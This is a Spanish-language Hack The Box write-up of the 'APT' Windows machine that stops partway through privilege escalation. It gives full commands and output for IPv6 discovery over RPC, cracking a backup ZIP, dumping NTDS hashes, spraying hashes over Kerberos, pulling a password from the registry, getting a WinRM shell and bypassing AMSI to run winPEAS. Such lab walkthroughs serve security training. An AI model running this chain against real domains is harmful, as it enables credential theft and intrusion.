---
layout: single
title: APT - Hack The Box
excerpt: "En este post vamos a estar haciendo la maquina APT de la plataforma de Hack The Box donde mediante una enumeración por RPC encontramos que se esta empleando IPV6 en la maquina victima a partir de eso conoceremos la dirección IP y comenzaremos a enumerar por smb donde encontraremos un .zip que vamos a crackear, vamos a estar empleando kerbrute para validar usuarios, vamos a leer registros de la maquina, vamos a hacer un bypass al antivirus para poder correr el winpeas y en esta maquina vamos a estar jugando con un hash NTLMv1"
date: 2024-04-01
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-apt/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Active Directory
  - RPC Enumeration
  - SMB Enumeration
  - IPV6
  - Cracking ZIP file
  - NTDS enumeration
  - Registry Hives Enumeration
  - Windows Defender Evasion
  - NTLMv1 Hash
---

## PortScan

- Comenzamos escaneando los puertos abiertos por el protocolo **TCP**.

```bash
➜  nmap sudo nmap -sCV -p80,135 10.129.96.60 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-31 19:00 CST
Nmap scan report for 10.129.96.60
Host is up (0.092s latency).

PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 10.0
|_http-title: Gigantic Hosting | Home
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Enumeración 

- Tenemos el puerto **80** abierto que esta corriendo un servicio **http** eso significa que hay una pagina web.

```ruby
➜  nmap whatweb http://10.129.96.60 -v
WhatWeb report for http://10.129.96.60
Status    : 200 OK
Title     : Gigantic Hosting | Home
IP        : 10.129.96.60
Country   : RESERVED, ZZ

Summary   : Bootstrap, Email[sales@gigantichosting.com], HTML5, HTTPServer[Microsoft-IIS/10.0], JQuery, Microsoft-IIS[10.0], Script[application/x-javascript,text/javascript]

Detected Plugins:
[ Bootstrap ]
	Bootstrap is an open source toolkit for developing with
	HTML, CSS, and JS.

	Website     : https://getbootstrap.com/

[ Email ]
	Extract email addresses. Find valid email address and
	syntactically invalid email addresses from mailto: link
	tags. We match syntactically invalid links containing
	mailto: to catch anti-spam email addresses, eg. bob at
	gmail.com. This uses the simplified email regular
	expression from
	http://www.regular-expressions.info/email.html for valid
	email address matching.

	String       : sales@gigantichosting.com

[ HTML5 ]
	HTML version 5, detected by the doctype declaration


[ HTTPServer ]
	HTTP server header string. This plugin also attempts to
	identify the operating system from the server header.

	String       : Microsoft-IIS/10.0 (from server string)

[ JQuery ]
	A fast, concise, JavaScript that simplifies how to traverse
	HTML documents, handle events, perform animations, and add
	AJAX.

	Website     : http://jquery.com/

[ Microsoft-IIS ]
	Microsoft Internet Information Services (IIS) for Windows
	Server is a flexible, secure and easy-to-manage Web server
	for hosting anything on the Web. From media streaming to
	web application hosting, IIS's scalable and open
	architecture is ready to handle the most demanding tasks.

	Version      : 10.0
	Website     : http://www.iis.net/

[ Script ]
	This plugin detects instances of script HTML elements and
	returns the script language/type.

	String       : application/x-javascript,text/javascript

HTTP Headers:
	HTTP/1.1 200 OK
	Content-Type: text/html
	Last-Modified: Mon, 23 Dec 2019 11:29:26 GMT
	Accept-Ranges: bytes
	ETag: "0ef5b3b84b9d51:0"
	Server: Microsoft-IIS/10.0
	Date: Mon, 01 Apr 2024 01:02:04 GMT
	Connection: close
	Content-Length: 14879
```

- Esta es la pagina web.

<p align="center">
<img src="/assets/images/htb-writeup-apt/1.png">
</p>

- Vamos a seguir haciendo **Fuzzing** ya que la pagina web no es muy interesante y no encontré nada así que vamos a ver si la herramienta `wfuzz` nos descubre algo.

```bash
➜  nmap wfuzz -c --hc=404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.96.60/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.96.60/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000002:   301        1 L      10 W       150 Ch      "images"
000000189:   301        1 L      10 W       150 Ch      "Images"
000000536:   301        1 L      10 W       147 Ch      "css"
000000939:   301        1 L      10 W       146 Ch      "js"
000002757:   301        1 L      10 W       149 Ch      "fonts"
000003659:   301        1 L      10 W       150 Ch      "IMAGES"
000005568:   301        1 L      10 W       149 Ch      "Fonts"
000008461:   301        1 L      10 W       147 Ch      "CSS"
000009123:   301        1 L      10 W       146 Ch      "JS"
```

- Bueno como tal también tenemos el protocolo **RPC** abierto pero no nos funciona.

```bash
➜  nmap rpcclient -N -U '' 10.129.96.60
Cannot connect to server.  Error was NT_STATUS_IO_TIMEOUT
```

- Si buscamos en <https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc> como enumerar este servicio al final del post nos dejan esta herramienta <https://github.com/mubix/IOXIDResolver> ya que es posible enumerar interfaces de red con **rcp** <https://www.cyber.airbus.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/>.

- Vamos a clonarnos el repositorio.

```bash
➜  content git clone https://github.com/mubix/IOXIDResolver
Cloning into 'IOXIDResolver'...
remote: Enumerating objects: 33, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (30/30), done.
remote: Total 33 (delta 12), reused 5 (delta 2), pack-reused 0
Receiving objects: 100% (33/33), 9.04 KiB | 308.00 KiB/s, done.
Resolving deltas: 100% (12/12), done.
➜  content cd IOXIDResolver
➜  IOXIDResolver git:(main) ls
IOXIDResolver.py  LICENSE  README.md  requirements.txt
➜  IOXIDResolver git:(main) pip install -r requirements.txt
Defaulting to user installation because normal site-packages is not writeable
Requirement already satisfied: impacket>0 in /usr/lib/python3/dist-packages (from -r requirements.txt (line 1)) (0.11.0)
Requirement already satisfied: dsinternals in /usr/lib/python3/dist-packages (from impacket>0->-r requirements.txt (line 1)) (1.2.4)
```

- Si ejecutamos la herramienta solo nos piden un **target**.

```bash
➜  IOXIDResolver git:(main) python3 IOXIDResolver.py -h
IOXIDResolver.py -t <target>
```

- Si le damos la **IP** vemos que nos reporta una dirección en **IPV6**.

```bash
➜  IOXIDResolver git:(main) python3 IOXIDResolver.py -t 10.129.96.60
[*] Retrieving network interface of 10.129.96.60
Address: apt
Address: 10.129.96.60
Address: dead:beef::1c3
Address: dead:beef::b885:d62a:d679:573f
Address: dead:beef::5c2e:939a:a5ff:2f03
```

- Para comprobar si la `ip` esta activa podemos lanzar un `ping`.

```bash
➜  IOXIDResolver git:(main) ping6 -c 1 dead:beef::b885:d62a:d679:573f
PING dead:beef::b885:d62a:d679:573f (dead:beef::b885:d62a:d679:573f) 56 data bytes
64 bytes from dead:beef::b885:d62a:d679:573f: icmp_seq=1 ttl=63 time=90.1 ms

--- dead:beef::b885:d62a:d679:573f ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 90.110/90.110/90.110/0.000 ms
```

## PortScan ipv6

- Ahora lo que podemos hacer es un escaneo con `Nmap` para ver los puertos abiertos.

```bash
➜  nmap sudo nmap -sCV -p53,80,88,135,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49673,49689,63855 -6 dead:beef::b885:d62a:d679:573f -oN targeted2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-31 19:35 CST
Nmap scan report for dead:beef::b885:d62a:d679:573f
Host is up (0.094s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-server-header:
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
|_http-title: Bad Request
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-04-01 01:35:24Z)
135/tcp   open  msrpc        Microsoft Windows RPC
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
|_ssl-date: 2024-04-01T01:36:34+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2024-04-01T01:36:34+00:00; -1s from scanner time.
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2024-04-01T01:36:34+00:00; -1s from scanner time.
3269/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
|_ssl-date: 2024-04-01T01:36:34+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc        Microsoft Windows RPC
49673/tcp open  msrpc        Microsoft Windows RPC
49689/tcp open  msrpc        Microsoft Windows RPC
63855/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: APT; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -8m34s, deviation: 22m38s, median: -1s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: apt
|   NetBIOS computer name: APT\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: apt.htb.local
|_  System time: 2024-04-01T02:36:24+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time:
|   date: 2024-04-01T01:36:25
|_  start_date: 2024-04-01T00:50:55
```

## Enumeración IPV6

- Vemos que estamos ante un **Windows Server 2016 Standard**.

```bash
➜  nmap crackmapexec smb dead:beef::b885:d62a:d679:573f
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
```

- Vamos agregar el dominio al `/etc/hots`.

```bash
➜  nmap echo "dead:beef::b885:d62a:d679:573f apt apt.local.htb htb.local" | sudo tee -a /etc/hosts
dead:beef::b885:d62a:d679:573f apt apt.local.htb htb.local
```

- Vamos a enumerar recursos compartidos a nivel de red aprovechando que el servicio de **smb** esta abierto.

```bash
➜  nmap smbclient -L apt -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	backup          Disk
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	SYSVOL          Disk      Logon server share
apt is an IPv6 address -- no workgroup available
```

- El recurso **backup** es interesante vamos a conectarnos al recurso compartido y ver lo que hay adentro.

```bash
➜  content smbclient //apt/backup -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Sep 24 02:30:52 2020
  ..                                  D        0  Thu Sep 24 02:30:52 2020
  backup.zip                          A 10650961  Thu Sep 24 02:30:32 2020

		5114623 blocks of size 4096. 2634373 blocks available
smb: \> get backup.zip
getting file \backup.zip of size 10650961 as backup.zip (1647.9 KiloBytes/sec) (average 1647.9 KiloBytes/sec)
smb: \>
```

- Y bueno tenemos un `.zip` y tiene esto dentro.

```bash
➜  content 7z l backup.zip

7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
 64-bit locale=C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 10650961 bytes (11 MiB)

Listing archive: backup.zip

--
Path = backup.zip
Type = zip
Physical Size = 10650961

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2020-09-23 11:40:25 D....            0            0  Active Directory
2020-09-23 11:38:20 .....     50331648      8483543  Active Directory/ntds.dit
2020-09-23 11:38:20 .....        16384          342  Active Directory/ntds.jfm
2020-09-23 11:40:25 D....            0            0  registry
2020-09-23 11:22:12 .....       262144         8522  registry/SECURITY
2020-09-23 11:22:12 .....     12582912      2157644  registry/SYSTEM
------------------- ----- ------------ ------------  ------------------------
2020-09-23 11:40:25           63193088     10650051  4 files, 2 folders
```

- Vemos archivos `ntds` <https://docs.iwolfsec.com/tecnicas-y-ataques/ataques-a-directorio-activo/credenciales/dumping-active-directory-hashes-ntds.dit> aquí se almacenan los hashes `NTLM`, usuarios, grupos, miembros de un grupo y mas.

- Bueno nos pide contraseña.

```bash
➜  content unzip backup.zip
Archive:  backup.zip
   creating: Active Directory/
[backup.zip] Active Directory/ntds.dit password:
```

- Vamos a usar `zip2john`.

```bash
➜  content zip2john backup.zip > hash
ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: cmplen=8483543, decmplen=50331648, crc=ACD0B2FB ts=9CCA cs=acd0 type=8
ver 2.0 backup.zip/Active Directory/ntds.jfm PKZIP Encr: cmplen=342, decmplen=16384, crc=2A393785 ts=9CCA cs=2a39 type=8
ver 2.0 backup.zip/registry/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/registry/SECURITY PKZIP Encr: cmplen=8522, decmplen=262144, crc=9BEBC2C3 ts=9AC6 cs=9beb type=8
ver 2.0 backup.zip/registry/SYSTEM PKZIP Encr: cmplen=2157644, decmplen=12582912, crc=65D9BFCD ts=9AC6 cs=65d9 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
➜  content cat hash
backup.zip:$pkzip$4*1*1*0*8*24*9beb*0f135e8d5f02f852643d295a889cbbda196562ad42425146224a8804421ca88f999017ed*1*0*8*24*65d9*2a1c4c81fb6009425c2d904699497b75d843f69f8e623e3edb81596de9e732057d17fae8*1*0*8*24*acd0*0949e46299de5eb626c75d63d010773c62b27497d104ef3e2719e225fbde9d53791e11a5*2*0*156*4000*2a393785*81733d*37*8*156*2a39*0325586c0d2792d98131a49d1607f8a2215e39d59be74062d0151084083c542ee61c530e78fa74906f6287a612b18c788879a5513f1542e49e2ac5cf2314bcad6eff77290b36e47a6e93bf08027f4c9dac4249e208a84b1618d33f6a54bb8b3f5108b9e74bc538be0f9950f7ab397554c87557124edc8ef825c34e1a4c1d138fe362348d3244d05a45ee60eb7bba717877e1e1184a728ed076150f754437d666a2cd058852f60b13be4c55473cfbe434df6dad9aef0bf3d8058de7cc1511d94b99bd1d9733b0617de64cc54fc7b525558bc0777d0b52b4ba0a08ccbb378a220aaa04df8a930005e1ff856125067443a98883eadf8225526f33d0edd551610612eae0558a87de2491008ecf6acf036e322d4793a2fda95d356e6d7197dcd4f5f0d21db1972f57e4f1543c44c0b9b0abe1192e8395cd3c2ed4abec690fdbdff04d5bb6ad12e158b6a61d184382fbf3052e7fcb6235a996*$/pkzip$::backup.zip:Active Directory/ntds.jfm, registry/SECURITY, registry/SYSTEM, Active Directory/ntds.dit:backup.zip
```

- Si lo crackeamos vemos la contraseña.

```bash
➜  content john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iloveyousomuch   (backup.zip)
1g 0:00:00:00 DONE (2024-03-31 19:56) 16.66g/s 136533p/s 136533c/s 136533C/s newzealand..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- Y ahora si podemos usar `unzip` pasándole la contraseña.

```bash
➜  content unzip backup.zip
Archive:  backup.zip
   creating: Active Directory/
[backup.zip] Active Directory/ntds.dit password:
  inflating: Active Directory/ntds.dit
  inflating: Active Directory/ntds.jfm
   creating: registry/
  inflating: registry/SECURITY
  inflating: registry/SYSTEM
```

- Podemos usar `impacket-secretsdump` ya que el `ntds` y el `SYSTEM` lo tenemos para dumpear `hashes`.

```bash
➜  content impacket-secretsdump -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL > hashes
```

- Bueno tenemos 2000 usuarios.

```bash
➜  content cat hashes | wc -l
2000
```

- Para validar usuarios validos del dominio podemos emplear le herramienta <https://github.com/ropnop/kerbrute>.

```bash
➜  content ./kerbrute userenum --dc apt -d htb.local users

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 03/31/24 - Ronnie Flathers @ropnop

2024/03/31 20:13:04 >  Using KDC(s):
2024/03/31 20:13:04 >  	apt:88

2024/03/31 20:13:09 >  [+] VALID USERNAME:	 APT$@htb.local
2024/03/31 20:13:09 >  [+] VALID USERNAME:	 Administrator@htb.local
2024/03/31 20:17:08 >  [+] VALID USERNAME:	 henry.vinson@htb.local
```

- Bueno tenemos un usuario valido que se llama **henry.vinson**.

- Si probamos obtener un TGT para el usuario que tenemos no funciona.

```bash
➜  content impacket-GetNPUsers htb.local/ -no-pass -usersfile user_valid.txt
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User henry.vinson doesn't have UF_DONT_REQUIRE_PREAUTH set
```

- Lo que vamos hacer ahora es fuerza bruta para ver si de los hashes que tenemos alguno le corresponde al usuario.

- Pero hemos sido baneados.

```bash
➜  content crackmapexec smb dead:beef::b885:d62a:d679:573f -u 'henry.vinson' -H hashes
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:2b576acbe6bcfda7294d6bd18041b8fe STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:b300272f1cdab4469660d55fe59415cb STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:72791983d95870c0d6dd999e4389b211 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:9ea25adafeec63e38cef4259d3b15c30 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:3ae49ec5e6fed82ceea0dc2be77750ab STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:531c98e26cfa3caee2174af495031187 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:fde29e6cb61b4f7fda1ad5cd2759329d STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:51d368765462e9c5aebc456946d8dc86 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:273c48fb014f8e5bf9e2918e3bf7bfbd STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:98590500f99a1bee7559e97ad342d995 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:10cf01167854082e180cf549f63c0285 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:813f9d0988b9242eec1e45907344b591 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:6149000a4f3f7c57642cbee1ea70c3e1 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] Connection Error: The NETBIOS connection with the remote host timed out.
^C

[*] Shutting down, please wait...
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] Connection Error: The NETBIOS connection with the remote host timed out.
```

## Shell as henry_vinson_adm

- No podemos aplicar fuerza bruta por **smb** pero si por `kerberos` <https://github.com/0xAnomaly/KerbSpray>.

```bash
➜  KerbSpray git:(main) ✗ python3 KerbSpray.py htb.local henry.vinson apt.local.htb hashes
[*] Spraying Hashes...

[i] Domain:             htb.local
[i] Target User:        henry.vinson
[i] Domain Controller:  apt.local.htb
[+] Success htb.local/henry.vinson
[+] Hash Found: e53d87d42adaa3ca32bdb34a876cbffb
```

- Ahora que tenemos el **hash** podemos comprobar si es correcto.

```bash
➜  content crackmapexec smb dead:beef::b885:d62a:d679:573f -u 'henry.vinson' -H 'e53d87d42adaa3ca32bdb34a876cbffb'
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] htb.local\henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb
```

- Como tenemos credenciales validas podemos intentar un `Kerberoasting attack` para solicitar tickets TGS <https://ciberseguridad.com/amenzas/ataques-kerberoasting/>.

- Pero bueno no tuvimos éxito.

```bash
➜  content impacket-GetNPUsers  htb.local/henry.vinson -hashes :e53d87d42adaa3ca32bdb34a876cbffb
Impacket v0.11.0 - Copyright 2023 Fortra

No entries found!
```

- Podemos listar registros de la maquina <https://threat.media/definition/what-is-a-registry-hive/#:~:text=A%20registry%20hive%20is%20a,logs%20in%20to%20a%20computer.> para esto podemos usar la herramienta de `impacket-reg` le tenemos que proporcionar un **KeyName** <https://www.herongyang.com/Windows/Registry-Hives-HKCR-HKCU-HKLM-HKU-HKCC-HCPD.html>.

```bash
➜  content impacket-reg htb.local/henry.vinson@apt -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName 'HKU'
Impacket v0.11.0 - Copyright 2023 Fortra

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU
HKU\Console
HKU\Control Panel
HKU\Environment
HKU\Keyboard Layout
HKU\Network
HKU\Software
HKU\System
HKU\Volatile Environment
```

- Vamos a ver lo que hay en `Software`.

- Si miramos vemos que hay un `GiganticHostingManagementSystem` y la pagina web de la maquina se llama GiganticHosting.

```bash
➜  content impacket-reg htb.local/henry.vinson@apt -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName 'HKU\Software'
Impacket v0.11.0 - Copyright 2023 Fortra

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\Software
HKU\Software\GiganticHostingManagementSystem
HKU\Software\Microsoft
HKU\Software\Policies
HKU\Software\RegisteredApplications
HKU\Software\Sysinternals
HKU\Software\VMware, Inc.
HKU\Software\Wow6432Node
HKU\Software\Classes
```

- Si vemos lo que hay encontramos un usuario nuevo y su contraseña.

```bash
➜  content impacket-reg htb.local/henry.vinson@apt -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName 'HKU\Software\GiganticHostingManagementSystem'
Impacket v0.11.0 - Copyright 2023 Fortra

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\Software\GiganticHostingManagementSystem
	UserName	REG_SZ	 henry.vinson_adm
	PassWord	REG_SZ	 G1#Ny5@2dvht
```

- Ahora podemos validas las credenciales para ver si son correctas.

```bash
➜  content crackmapexec smb dead:beef::b885:d62a:d679:573f -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht'
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] htb.local\henry.vinson_adm:G1#Ny5@2dvht
```

- Algo que podemos hacer es ver si el usuario forma parte del grupo `Remote Management Users` para conectarnos con `evil-winrm`.

```bash
➜  content crackmapexec winrm htb.local -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht'
SMB         apt             5985   APT              [*] Windows 10.0 Build 14393 (name:APT) (domain:htb.local)
HTTP        apt             5985   APT              [*] http://apt:5985/wsman
WINRM       apt             5985   APT              [+] htb.local\henry.vinson_adm:G1#Ny5@2dvht (Pwn3d!)
```

- Ahora ya nos podemos conectar.

```bash
➜  content evil-winrm -i apt.local.htb -u 'henry.vinson_adm' -p G1#Ny5@2dvht

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> whoami
htb\henry.vinson_adm
```

## User flag

- Ya podemos leer la flag.

```bash
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Desktop> dir


    Directory: C:\Users\henry.vinson_adm\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         4/1/2024   6:29 PM             34 user.txt


*Evil-WinRM* PS C:\Users\henry.vinson_adm\Desktop> type user.txt
d559647d74b6b9fe38018220d86e0a7e
```

## Escalada de privilegios

- Después de enumerar no encontré mucho así que vamos a usar una herramienta famosa de reconocimiento <https://github.com/carlospolop/PEASS-ng/releases/tag/20240331-d41b024f>.

- Pero bueno si lo ejecutamos vemos que el **antivirus** lo detecta y no se puede ejecuta por eso.

```bash
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> upload winPEASx64.exe

Info: Uploading /home/miguel/Hackthebox/APT/content/winPEASx64.exe to C:\Users\henry.vinson_adm\Documents\winPEASx64.exe

Data: 3183272 bytes of 3183272 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> .\WinPEASx64.exe
Program 'winPEASx64.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ .\WinPEASx64.exe
+ ~~~~~~~~~~~~~~~~.
At line:1 char:1
+ .\WinPEASx64.exe
+ ~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents>
```

- Pero podemos hacer un **Bypass**.

```bash
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> menu


   ,.   (   .      )               "            ,.   (   .      )       .
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Dll-Loader
[+] Donut-Loader
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit
```

- Primero vamos a ejecutar el `Bypass-4MSI`.

```bash
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> Bypass-4MSI

Info: Patching 4MSI, please be patient...

[+] Success!
```

- Ahora usamos el `Invoke-Binary` para que desde nuestro equipo se ejecute indicándole la ruta y lo estaríamos inyectando en memoria.

- Una vez que termine nos reportara todo el `output`.

```bash
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> Invoke-Binary /home/miguel/Hackthebox/APT/content/winPEASx64.exe
```

- Lo mas interesante es esto vemos que soporta `NTLMv1` y es criptografía débil.

```bash
╔══════════╣ Enumerating NTLM Settings
  LanmanCompatibilityLevel    : 2 (Send NTLM response only)


  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
